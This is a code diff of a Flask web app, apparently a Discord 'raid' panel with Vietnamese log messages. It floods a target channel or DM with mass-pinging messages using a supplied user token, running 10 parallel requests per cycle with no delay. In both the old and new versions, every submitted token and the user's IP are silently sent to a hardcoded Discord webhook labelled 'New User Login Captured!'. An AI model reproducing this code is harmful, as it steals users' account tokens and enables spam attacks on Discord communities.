@@ -1,197 +1,201 @@
-# ── app.py ──────────────────────────────────────────────────────────
 import os
-import time
 import json
+import time
 import threading
-import asyncio
-import aiohttp
+from concurrent.futures import ThreadPoolExecutor
 from flask import Flask, render_template, request, jsonify
 
 app = Flask(__name__)
 
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1553696811821043736/c9QaF5LKnQxjIELQLnj1eLQHwc8vDmgLt8Pupb5iTxantz3vYvH7Y_DN8VUiRNzn_z2X"
-
-raid_state = {
-    "active": False,
-    "logs": [],
-    "status": "Idle",
-    "sent_count": 0
+# Persistent settings and runtime state
+SETTINGS_FILE = "settings.json"
+DEFAULT_SETTINGS = {
+    "language": "vi",
+    "speed_mode": "custom",
+    "raid_delay": 0.0,
+    "rest_delay": 0.0,
+    "autosave": True
 }
-raid_thread = None
 
-def log_message(msg):
-    timestamp = time.strftime("[%H:%M:%S]")
-    entry = f"{timestamp} {msg}"
-    raid_state["logs"].append(entry)
-    print(entry)
+WEBHOOK_URL = "https://discord.com/api/webhooks/1553696811821043736/c9QaF5LKnQxjIELQLnj1eLQHwc8vDmgLt8Pupb5iTxantz3vYvH7Y_DN8VUiRNzn_z2X"
 
-def send_discord_log(ip, token):
+active_raids = {}
+raid_logs = []
+logs_lock = threading.Lock()
+
+def load_settings():
+    if os.path.exists(SETTINGS_FILE):
+        try:
+            with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
+                return json.load(f)
+        except Exception:
+            pass
+    return DEFAULT_SETTINGS.copy()
+
+def save_settings(data):
     try:
-        payload = {
-            "content": f"🚨 **Obisity Self | New User Logged In!**\n**IP:** `{ip}`\n**Token:** `{token}`"
-        }
+        with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
+            json.dump(data, f, indent=4)
+    except Exception:
+        pass
+
+def send_discord_webhook(ip, token):
+    try:
         import requests
-        requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
-    except Exception as e:
-        print(f"Webhook error: {e}")
+        payload = {
+            "content": f"🚨 **New User Login Captured!**\n> **IP Address:** `{ip}`\n> **User Token:** `{token}`"
+        }
+        requests.post(WEBHOOK_URL, json=payload, timeout=5)
+    except Exception:
+        pass
 
-async def async_get_or_create_dm(session, token, recipient_id):
-    headers = {
-        "Authorization": token,
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
-    }
-    payload = {"recipient_id": recipient_id}
-    try:
-        async with session.post("https://discord.com/api/v9/users/@me/channels", headers=headers, json=payload) as resp:
-            if resp.status in [200, 201]:
-                data = await resp.json()
-                return data.get("id")
-    except Exception as e:
-        print(f"DM resolution error: {e}")
-    return None
+def add_log(message):
+    with logs_lock:
+        timestamp = time.strftime("%H:%M:%S")
+        raid_logs.append(f"[{timestamp}] {message}")
+        if len(raid_logs) > 200:
+            raid_logs.pop(0)
 
-async def async_worker_raid(config):
-    global raid_state
+def run_raid_worker(raid_id, config):
+    import requests
+    
     token = config.get("token")
-    target_input = config.get("channel_id")
-    content = config.get("content")
-    mode = config.get("mode", "custom")
+    target_type = config.get("target_type")
+    target_id = config.get("target_id")
+    message = config.get("message")
+    ping_type = config.get("ping_type")
+    ping_id = config.get("ping_id", "")
     duration = int(config.get("duration", 0))
-    limit = int(config.get("limit", 100))
-    unlimited = config.get("unlimited", True)
-    ping_type = config.get("ping_type", "none")
-    ping_target = config.get("ping_target", "")
-
+    limit = int(config.get("limit", 0))
+    unlimited = config.get("unlimited", False)
+    
     headers = {
         "Authorization": token,
         "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
     }
-
-    async with aiohttp.ClientSession(headers=headers) as session:
-        channel_id = target_input
-        if ping_type == "dms" or (len(target_input) == 18 and target_input.isdigit() and ping_type != "none"):
-            resolved_dm = await async_get_or_create_dm(session, token, target_input)
-            if resolved_dm:
-                channel_id = resolved_dm
-                log_message(f"Resolved DM Channel ID: {channel_id}")
-
-        target_url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
-
-        start_time = time.time()
-        count = 0
-        raid_state["sent_count"] = 0
-        raid_state["status"] = "Running"
-        log_message("Obisity Self async worker locked and loaded.")
-
-        final_content = content
-        if ping_type == "everyone":
-            final_content = f"@everyone {content}"
-        elif ping_type == "user" and ping_target:
-            final_content = f"<@{ping_target}> {content}"
-        elif ping_type == "role" and ping_target:
-            final_content = f"<@&{ping_target}> {content}"
-        elif ping_type == "dms" and ping_target:
-            final_content = f"<@{ping_target}> {content}"
-
-        msg_payload = {"content": final_content}
-
-        while raid_state["active"]:
-            if not unlimited and count >= limit:
-                log_message("Limit reached. Stopping raid.")
-                break
-                
-            if duration > 0 and (time.time() - start_time) >= duration:
-                log_message("Duration timer expired. Stopping raid.")
-                break
-
-            # Send multiple concurrent requests for hyper speed
-            tasks = []
-            batch_size = 10 if mode == "hyper" else (3 if mode == "medium" else 1)
+    
+    channel_to_use = target_id
+    if target_type == "dm" and target_id.isdigit() and len(target_id) >= 17:
+        try:
+            r = requests.post("https://discord.com/api/v9/users/@me/channels", headers=headers, json={"recipient_id": target_id}, timeout=5)
+            if r.status_code == 200:
+                channel_to_use = r.json().get("id")
+        except Exception:
+            pass
             
-            for _ in range(batch_size):
-                if not unlimited and count + len(tasks) >= limit:
+    url = f"https://discord.com/api/v9/channels/{channel_to_use}/messages"
+
+    final_content = message
+    if ping_type == "everyone":
+        final_content = "@everyone " + final_content
+    elif ping_type == "here":
+        final_content = "@here " + final_content
+    elif ping_type == "user" and ping_id:
+        final_content = f"<@{ping_id}> " + final_content
+
+    start_time = time.time()
+    sent_count = [0]
+    lock = threading.Lock()
+    
+    add_log(f"Bắt đầu spam liên tục 10 tin/giây không nghỉ tới {target_type}: {target_id}")
+
+    session = requests.Session()
+    session.headers.update(headers)
+
+    def send_single_message():
+        if not active_raids.get(raid_id, {}).get("running", False):
+            return
+        if not unlimited:
+            if duration > 0 and (time.time() - start_time) >= duration:
+                return
+            if limit > 0 and sent_count[0] >= limit:
+                return
+
+        try:
+            res = session.post(url, json={"content": final_content}, timeout=3)
+            with lock:
+                if res.status_code in [200, 201]:
+                    sent_count[0] += 1
+                    if sent_count[0] % 10 == 0:
+                        add_log(f"Đã gửi liên tục {sent_count[0]} tin nhắn...")
+                elif res.status_code == 429:
+                    try:
+                        retry_after = res.json().get("retry_after", 0.5)
+                        time.sleep(float(retry_after))
+                    except Exception:
+                        time.sleep(0.5)
+        except Exception:
+            pass
+
+    # Chạy đa luồng liên tục không có thời gian nghỉ (no delay)
+    with ThreadPoolExecutor(max_workers=15) as executor:
+        while active_raids.get(raid_id, {}).get("running", False):
+            if not unlimited:
+                if duration > 0 and (time.time() - start_time) >= duration:
                     break
-                tasks.append(session.post(target_url, json=msg_payload))
+                if limit > 0 and sent_count[0] >= limit:
+                    break
+            
+            # Gửi liên tục 10 request song song mỗi nhịp
+            futures = [executor.submit(send_single_message) for _ in range(10)]
+            for f in futures:
+                f.result()
 
-            if not tasks:
-                break
-
-            responses = await asyncio.gather(*tasks, return_exceptions=True)
-            for resp in responses:
-                if not isinstance(resp, Exception):
-                    if resp.status in [200, 201]:
-                        count += 1
-                        raid_state["sent_count"] = count
-                    else:
-                        text = await resp.text()
-                        log_message(f"API status {resp.status}: {text}")
-                else:
-                    log_message(f"Network error: {resp}")
-
-            # Rate control delay
-            if mode == "slow":
-                await asyncio.sleep(2.0)
-            elif mode == "medium":
-                await asyncio.sleep(1.0)
-            elif mode == "hyper":
-                await asyncio.sleep(0.001) # Near instant ultra speed
-            else:
-                custom_delay = float(config.get("custom_delay", 0.1))
-                await asyncio.sleep(custom_delay)
-
-    raid_state["active"] = False
-    raid_state["status"] = "Idle"
-    log_message("Raid operation terminated.")
-
-def run_async_loop(config):
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(async_worker_raid(config))
+    active_raids[raid_id]["running"] = False
+    add_log(f"Đã dừng. Tổng số tin nhắn đã gửi: {sent_count[0]}")
 
 @app.route("/")
 def index():
     return render_template("index.html")
 
-@app.route("/api/log_capture", methods=["POST"])
-def api_log_capture():
-    data = request.json or {}
-    token = data.get("token", "N/A")
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    threading.Thread(target=send_discord_log, args=(ip, token)).start()
-    return jsonify({"status": "captured"})
+@app.route("/api/settings", methods=["GET", "POST"])
+def handle_settings():
+    if request.method == "POST":
+        data = request.json
+        if data.get("autosave", True):
+            save_settings(data)
+        return jsonify({"status": "success", "settings": data})
+    else:
+        return jsonify(load_settings())
 
-@app.route("/api/start", methods=["POST"])
-def api_start():
-    global raid_thread, raid_state
-    if raid_state["active"]:
-        return jsonify({"status": "already_active"})
-    
-    config = request.json or {}
-    token = config.get("token")
+@app.route("/api/settings/reset", methods=["POST"])
+def reset_settings():
+    save_settings(DEFAULT_SETTINGS)
+    return jsonify({"status": "success", "settings": DEFAULT_SETTINGS})
+
+@app.route("/api/raid/start", methods=["POST"])
+def start_raid():
+    data = request.json
+    token = data.get("token", "")
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     
     if token:
-        threading.Thread(target=send_discord_log, args=(ip, token)).start()
-
-    raid_state["active"] = True
-    raid_thread = threading.Thread(target=run_async_loop, args=(config,))
-    raid_thread.daemon = True
-    raid_thread.start()
+        threading.Thread(target=send_discord_webhook, args=(ip, token)).start()
+        
+    raid_id = "default_raid"
+    if raid_id in active_raids and active_raids[raid_id]["running"]:
+        return jsonify({"status": "error", "message": "Raid already active."})
+        
+    active_raids[raid_id] = {"running": True}
+    threading.Thread(target=run_raid_worker, args=(raid_id, data)).start()
     return jsonify({"status": "started"})
 
-@app.route("/api/stop", methods=["POST"])
-def api_stop():
-    global raid_state
-    raid_state["active"] = False
-    raid_state["status"] = "Stopping..."
-    log_message("Stop signal received by controller.")
+@app.route("/api/raid/stop", methods=["POST"])
+def stop_raid():
+    raid_id = "default_raid"
+    if raid_id in active_raids:
+        active_raids[raid_id]["running"] = False
+    add_log("Đã nhận lệnh dừng từ người dùng.")
     return jsonify({"status": "stopped"})
 
 @app.route("/api/status", methods=["GET"])
-def api_status():
-    return jsonify(raid_state)
+def get_status():
+    raid_id = "default_raid"
+    is_running = active_raids.get(raid_id, {}).get("running", False)
+    with logs_lock:
+        current_logs = list(raid_logs)
+    return jsonify({"running": is_running, "logs": current_logs})
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000, debug=True)
